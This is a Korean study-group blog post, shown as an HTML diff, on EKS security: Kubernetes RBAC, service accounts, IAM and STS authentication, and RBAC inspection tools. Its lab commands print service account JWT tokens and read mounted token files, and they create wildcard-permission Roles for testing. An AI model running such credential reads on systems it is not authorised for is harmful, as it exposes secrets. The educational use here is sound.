@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="apple-icon-180x180" sizes="180x180" href='/img/favicon/apple-icon-180x180.png'>
+    <link rel="icon" type="image/png" sizes="32x32" href='/img/favicon/favicon-32x32.png'>
+    <link rel="icon" type="image/png" sizes="16x16" href='/img/favicon/favicon-16x16.png'>
+    <title>AWS EKS 스터디 6주차 - Security | kkumtree</title>
+    
+    <meta property="og:site_name" content="kkumtree" />
+    <meta property="og:title" content="AWS EKS 스터디 6주차 - Security" />
+
+    
+    <meta property="og:image" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />
+    <meta property="og:image:secure_url" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />
+
+    
+    <link rel="stylesheet" href="https://blog.minseong.xyz/sass/theme.min.8c1fb07f2dee90a6523f7317a7d023e3c1b14bd4706bff237c94e366d59facf9.css">
+</head><body><header id="navigation" class="p-navigation is-dark">
+  <div class="p-navigation__row">
+    <div class="p-navigation__banner">
+      <div class="p-navigation__tagged-logo" style="min-width: 6rem;">
+        <a class="p-navigation__link" href="/">
+          <div class="p-navigation__logo-tag">
+            <img class="p-navigation__logo-icon" src="/img/BlogWhite.svg" alt="">
+          </div>
+          <span class="p-navigation__logo-title">Blog</span>
+        </a>
+      </div>
+      <a href="#navigation" class="p-navigation__toggle--open" title="menu">Menu</a>
+      <a href="#navigation-closed" class="p-navigation__toggle--close" title="close menu">Close menu</a>
+    </div>
+    <nav class="p-navigation__nav" aria-label="Example sub navigation">
+      <ul class="p-navigation__items">
+        
+      </ul>
+     
+     <ul class="p-navigation__items">
+        <li class="p-navigation__item--dropdown-toggle" id="link-4">
+          <a class="p-navigation__link" aria-controls="account-menu">
+            🌏
+          </a>
+          <ul class="p-navigation__dropdown--right" id="account-menu" aria-hidden="true">
+            
+            
+            
+          </ul>
+        </li>
+        <li class="p-navigation__item--dropdown-toggle" id="link-4">
+          <a class="p-navigation__link" aria-controls="account-menu">
+            🔗
+          </a>
+          <ul class="p-navigation__dropdown--right" id="account-menu" aria-hidden="true">
+            
+          </ul>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header>
+<div id="content">
+
+
+<main>
+  <section class="p-strip--image main-strip"
+    }
+    style="background-image:url('cover.jpg'); background-position: center; background-repeat: no-repeat; background-size: cover;"
+    >
+      <div class="row">
+        
+        <div class="col-6">
+          <div class="p-card--overlay">
+            <h2>AWS EKS 스터디 6주차 - Security</h2>
+            <ul class="p-card__content p-inline-list--middot">
+              
+              <li class="p-inline-list__item">
+                kkumtree
+              </li>
+              
+            </ul>
+            <p><u class=" timedisplay" style="text-decoration-style: dotted;">2023-06-04T06:56:52&#43;09:00</u></p>
+            <p class="p-card__content"></p>
+            
+            <a href="/tags/aws" class="tag">
+              <div class="p-chip">
+                <span class="p-chip__value">AWS</span>
+              </div>
+            </a>
+            
+            <a href="/tags/eks" class="tag">
+              <div class="p-chip">
+                <span class="p-chip__value">EKS</span>
+              </div>
+            </a>
+            
+            <a href="/tags/cloudnet@" class="tag">
+              <div class="p-chip">
+                <span class="p-chip__value">CloudNet@</span>
+              </div>
+            </a>
+            
+            <a href="/tags/security" class="tag">
+              <div class="p-chip">
+                <span class="p-chip__value">security</span>
+              </div>
+            </a>
+            
+            <a href="/tags/irsa" class="tag">
+              <div class="p-chip">
+                <span class="p-chip__value">IRSA</span>
+              </div>
+            </a>
+            
+          </div>
+        </div>
+        
+      </div>
+  </section>
+  <section class="p-strip">
+  <div class="row">
+  <p>이번에는 인증 및 인가, 그리고 IRSA를 중심으로 EKS의 보안에 대해 학습해보았습니다.</p>
+<p>kops 스터디 때에는 잘 몰랐는데, 복기하다보니 RBAC은 기본으로 깔고..</p>
+<ul>
+<li>[4-1] pro<strong>j</strong>ected Volume</li>
+<li>[4-2] AWS Load Balancer Controller IRSA 및 LB Pod mutating</li>
+</ul>
+<p>위의 두 가지가 꽤나 중요한 파트를 차지하고 있었음을 알 수 있었습니다.<br>
+Network(2주차)가 매번 뭔가 일부가 아리송하였다면<br>
+Security는 복기하다가 이론적으로는 간단(과연 ?)해보여도,<br>
+실제 구동방식 이해 자체가 초반에 안되서 더 어려웠던 것 같습니다.</p>
+<h2 id="그-외">그 외</h2>
+<ol>
+<li>myeks-bastion-2에 접속 시, 함께 진행할 때는 <code>ssh {Public IP}</code>로 잘 접속되는 걸 봤는데 정작 혼자 할 땐 접속이 되지않았습니다.
+<ul>
+<li>Amazon Linux에서는 ssh ec2-user@{Public IP}로 접속해야함<br>
+(필요한 경우 ssh키도 포함)</li>
+<li>AWS Public AMI에서 제공되는 Ubuntu AMI의 경우,<br>
+ubuntu@{Public IP}로 접속가능</li>
+<li>추정: 공유된 머신에 다른 설정이 이슈가 되는 것으로 추정됩니다.</li>
+</ul>
+</li>
+<li>IAM User(testuser)는 웹콘솔에서 삭제하는 것이 편리합니다.
+<ul>
+<li>아니면, 아래처럼 detach 한다는 느낌으로 순차적 실행합니다.
+<ul>
+<li>list-attached-role-policies &amp;&amp; detach-role-policy</li>
+<li>list-access-keys &amp;&amp; delete-access-key</li>
+<li>delete-user</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CLI로 IAM Trust Relationship 조회
+<ul>
+<li>웹 콘솔에 굳이 들어가야하나 하고, 문득 해본 시도하다가 시간이 날아갔습니다.</li>
+<li>결론: 하드코어한 파싱..
+<ul>
+<li><code>jq -r '.[].status.roleARN' | rev | cut -d '/' -f1 | rev</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="./images/ssh-failure-1.png" alt="ssh failure 1"></p>
+<p><img src="./images/ssh-failure-2.png" alt="ssh failure 2"></p>
+<p><img src="./images/delete-user-with-cli.png" alt="delete user with cli"></p>
+<p><img src="./images/iam-trust-relationship-with-cli.png" alt="iam trust relationship with cli"></p>
+<h2 id="1-실습-환경-배포">1. 실습 환경 배포</h2>
+<ul>
+<li>모의공격(?) 테스트를 위해 2개의 bastion 서버가 구성된 환경 배포</li>
+<li>p8s 및 grafana의 경우, 선택적으로 배포해도 되서 기술 생략</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick5.yaml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 이하 중략</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CERT_ARN(ACM)의 경우에는 /etc/profile에 환경변수 저장을 안해둬서  </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 세션이 만료되면, 다시 재설정 필요</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CERT_ARN<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>aws acm list-certificates --query <span style="color:#e6db74">&#39;CertificateSummaryList[].CertificateArn[]&#39;</span> --output text<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>echo $CERT_ARN
+</span></span></code></pre></div><h2 id="2-k8s-인증인가">2. k8s 인증/인가</h2>
+<ul>
+<li><code>.kube/config</code> 파일을 기반
+<ul>
+<li>cluster: k8s API 서버 접속정보</li>
+<li>users: API 서버에 접속하기 위한 유저 인증정보 목록</li>
+<li>contexts: cluster및 user를 매핑(조합)한 정보</li>
+</ul>
+</li>
+</ul>
+<p><img src="./images/kubeconfig.png" alt="kubeconfig"></p>
+<h3 id="2-1-인증인가-실습">2-1. 인증/인가 실습</h3>
+<ul>
+<li>여기서는 인프라팀, 개발팀으로 각각의 ns에 유저를 생성하여 실습</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl create namespace dev-team
+</span></span><span style="display:flex;"><span>kubectl create ns infra-team
+</span></span><span style="display:flex;"><span>kubectl get ns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 네임스페이스에 서비스 어카운트 생성</span>
+</span></span><span style="display:flex;"><span>kubectl create sa dev-k8s -n dev-team
+</span></span><span style="display:flex;"><span>kubectl create sa infra-k8s -n infra-team
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 서비스 어카운트 정보 확인</span>
+</span></span><span style="display:flex;"><span>kubectl get sa -n dev-team
+</span></span><span style="display:flex;"><span>kubectl get sa dev-k8s -n dev-team -o yaml | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get sa -n infra-team
+</span></span><span style="display:flex;"><span>kubectl get sa infra-k8s -n infra-team -o yaml | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># dev-k8s 서비스 어카운트의 토큰 획득</span>
+</span></span><span style="display:flex;"><span>DevTokenName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get sa dev-k8s -n dev-team -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{.secrets[0].name}&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>DevToken<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get secret -n dev-team $DevTokenName -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{.data.token}&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $DevToken
+</span></span></code></pre></div><p><img src="./images/service-account.png" alt="service account"></p>
+<ul>
+<li>각각의 YAML파일에 토큰이 있는데 이는 JWT(Bearer)토큰으로 아래에서 확인가능
+<ul>
+<li><a href="https://jwt.io/">https://jwt.io/</a></li>
+<li>경우에 따라, Credential도 있기 때문에 취급주의</li>
+</ul>
+</li>
+</ul>
+<p><img src="./images/jwt.png" alt="jwt"></p>
+<ul>
+<li>SA 지정하여 파드 생성 후 권한 테스트</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dev-kubectl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: dev-k8s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: kubectl-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: bitnami/kubectl:1.24.10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;tail&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    args: [&#34;-f&#34;, &#34;/dev/null&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  terminationGracePeriodSeconds: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: infra-kubectl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: infra-k8s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: kubectl-pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: bitnami/kubectl:1.24.10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;tail&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    args: [&#34;-f&#34;, &#34;/dev/null&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  terminationGracePeriodSeconds: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 확인</span>
+</span></span><span style="display:flex;"><span>kubectl get pod -o dev-kubectl -n dev-team -o yaml | grep serviceAccount
+</span></span><span style="display:flex;"><span>kubectl get pod -o infra-kubectl -n infra-team -o yaml | grep serviceAccount
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드에 기본 적용되는 SA 정보(토큰) </span>
+</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- ls /run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/token
+</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/namespace
+</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 각 파드 접속하여, 정보 확인 with alias</span>
+</span></span><span style="display:flex;"><span>alias k1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl&#39;</span>
+</span></span><span style="display:flex;"><span>alias k2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 권한 테스트</span>
+</span></span><span style="display:flex;"><span>k1 get pods <span style="color:#75715e"># kubectl exec -it dev-kubectl -n dev-team -- kubectl get pods 와 동일한 실행 명령이다!</span>
+</span></span><span style="display:flex;"><span>k1 run nginx --image nginx:1.20-alpine
+</span></span><span style="display:flex;"><span>k1 get pods -n kube-system
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (옵션) kubectl 실행 사용자(host 기준)가 특정 권한을 가지고 있는지 확인 [결과: no]</span>
+</span></span><span style="display:flex;"><span>k1 auth can-i get pods
+</span></span></code></pre></div><p><img src="./images/test-pod-creation-for-sa.png" alt="test pod creation for sa"></p>
+<p><img src="./images/sa-failure-without-rolebinding.png" alt="sa failure without RoleBinding"></p>
+<ul>
+<li>당연히 되지 않음. 단지 SA를 만들어서 파드에 적어넣었을 뿐
+<ol>
+<li>Role의 부재</li>
+<li>SA와 Role의 매핑(RoleBinding)의 부재</li>
+</ol>
+</li>
+<li>아래에서 위의 두 가지를 생성</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 각 NS에 Role 생성 후 확인</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Role
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rules:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- apiGroups: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  resources: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  verbs: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Role
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rules:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- apiGroups: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  resources: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  verbs: [&#34;*&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl describe roles role-dev-team -n dev-team
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 각 NS에 SA와 Role 매핑(RoleBinding) 생성 후 확인</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: RoleBinding
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: roleB-dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">roleRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  apiGroup: rbac.authorization.k8s.io
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  kind: Role
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">subjects:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- kind: ServiceAccount
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dev-k8s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: RoleBinding
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: roleB-infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">roleRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  apiGroup: rbac.authorization.k8s.io
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  kind: Role
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">subjects:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- kind: ServiceAccount
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: infra-k8s
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl describe rolebindings roleB-dev-team -n dev-team
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 권한 테스트 성공</span>
+</span></span><span style="display:flex;"><span>alias k1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl&#39;</span>
+</span></span><span style="display:flex;"><span>alias k2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>k1 get pods 
+</span></span><span style="display:flex;"><span>k1 run nginx --image nginx:1.20-alpine
+</span></span><span style="display:flex;"><span>k1 get pods
+</span></span><span style="display:flex;"><span>k1 delete pods nginx
+</span></span><span style="display:flex;"><span>k1 get pods -n kube-system
+</span></span><span style="display:flex;"><span>k1 get nodes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>k1 auth can-i get pods <span style="color:#75715e"># yes</span>
+</span></span></code></pre></div><p><img src="./images/creation-role-for-sa.png" alt="creation role for sa"></p>
+<p><img src="./images/sa-success-with-rolebinding.png" alt="sa success with RoleBinding"></p>
+<h2 id="3-eks-인증인가">3. EKS 인증/인가</h2>
+<ul>
+<li>앞에서 k8s 인증/인가를 했다면 이제는 AWS IAM 서비스와 결합
+<ul>
+<li>인증: AWS IAM</li>
+<li>인가: k8s RBAC</li>
+</ul>
+</li>
+<li>원활한 진행을 위해 RBAC용 krew 플러그인 설치</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl krew install access-matrix rbac-tool rbac-view rolesum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 실습 NS인 default에서 액세스 매트릭스 </span>
+</span></span><span style="display:flex;"><span>kubectl access-matrix --namespace default
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA 단위의 RBAC 조회</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:nodes == eks:node-bootstrapper</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:bootstrappers == eks:node-bootstrapper</span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:masters
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA 단위의 RBAC 정책 규칙 </span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool policy-rules
+</span></span><span style="display:flex;"><span>kubectl rbac-tool policy-rules
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 해당 클러스터에서 사용 가능한 클러스터롤 조회</span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool show
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 클러스터에 인증된 현재 컨텍스트의 사용자 </span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool whoami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA 단위의 RBAC 역할 조회</span>
+</span></span><span style="display:flex;"><span>kubectl rolesum aws-node -n kube-system
+</span></span><span style="display:flex;"><span>kubectl rolesum -k User system:kube-proxy
+</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:masters
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (새로운 쉘) 현재 접속한 본인의 RBAC 권한을 시각적으로 </span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;RBAC View Web http://</span><span style="color:#66d9ef">$(</span>curl -s ipinfo.io/ip<span style="color:#66d9ef">)</span><span style="color:#e6db74">:8800&#34;</span>
+</span></span><span style="display:flex;"><span>kubectl rbac-view
+</span></span></code></pre></div><p><img src="./images/access-matrix.png" alt="access-matrix"></p>
+<p><img src="./images/lookup-rbac.png" alt="lookup RBAC"></p>
+<p><img src="./images/whoami-rbac.png" alt="whoami RBAC"></p>
+<p><img src="./images/rolesum-rbac.png" alt="rolesum RBAC"></p>
+<p><img src="./images/rbac-view.png" alt="rbac-view"></p>
+<h3 id="3-1-eks-인증인가-살펴보기">3-1. EKS 인증/인가 살펴보기</h3>
+<ul>
+<li>STS(Security Token Service)를 기반</li>
+<li>aws-cli v1.16.156부터 aws-iam-authenticator 설치 없이 get-token으로 획득 가능
+<ol>
+<li>kubectl ~ <code>aws eks get-token</code> ~ EKS Service Endpoint 요청 구조</li>
+<li>kubectl의 Client-Go 라이브러가 Pre-Signed URL을 Tokenize하여 엔드포인트 요청 <strong>[Credential 가득함. 유의!]</strong></li>
+<li>EKS API는 Webhook token authenticator에 Token Review Request<br>
+AWS IAM 해당 인증을 호출 완료 후, User/Role의 ARN 반환</li>
+<li>k8s RBAC 인가 처리</li>
+</ol>
+</li>
+<li>EKS configmap에서 <code>system:masters</code>나 <code>system:authenticated</code>로 예상되는 그룹 정보는 노출되지 않음
+<ul>
+<li>Human Error 예방 추정</li>
+<li><code>kubectl rbac-tool whoami</code>으로 조회 가능</li>
+</ul>
+</li>
+<li>(kubeconfig)v1beta1을 쓰고 있는데, 실습을 하다보면 간혹 token값 앞부분이 깨져나옴
+<ul>
+<li>To-Do: v1(GA) 이후로 해서 테스트해봐야 함</li>
+</ul>
+</li>
+</ul>
+<p><img src="./images/throttling-when-using-v1beta1.png" alt="throttling when using v1beta1"></p>
+<p><img src="./images/token-broken-when-using-v1beta1.png" alt="token broken when using v1beta1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># sts caller id의 ARN</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig 정보. get-token 커맨드 삽입 확인</span>
+</span></span><span style="display:flex;"><span>cat ~/.kube/config | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># STS 임시 보안 자격 증명 토큰 요청. 시간경과 시 토큰 재발급</span>
+</span></span><span style="display:flex;"><span>aws eks get-token --cluster-name $CLUSTER_NAME | jq -r <span style="color:#e6db74">&#39;.status.token&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># tokenreview, Webhook, validatingwebhookconfigurations API 리소스 </span>
+</span></span><span style="display:flex;"><span>kubectl api-resources | grep authentication
+</span></span><span style="display:flex;"><span>kubectl api-resources | grep Webhook
+</span></span><span style="display:flex;"><span>kubectl get validatingwebhookconfigurations
+</span></span><span style="display:flex;"><span>kubectl get validatingwebhookconfigurations eks-aws-auth-configmap-validation-webhook -o yaml | kubectl neat | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-auth configmap</span>
+</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EKS를 설치한 IAM User 정보</span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool whoami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters, system:authenticated 그룹 정보</span>
+</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:masters
+</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:authenticated
+</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:masters
+</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:authenticated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters 그룹이 사용 가능한 ClusterRole: cluster-admin</span>
+</span></span><span style="display:flex;"><span>kubectl describe clusterrolebindings.rbac.authorization.k8s.io cluster-admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cluster-admin 의 PolicyRule: 모든 리소스 사용 가능!</span>
+</span></span><span style="display:flex;"><span>kubectl describe clusterrole cluster-admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:authenticated 그룹이 사용 가능한 ClusterRole</span>
+</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:discovery
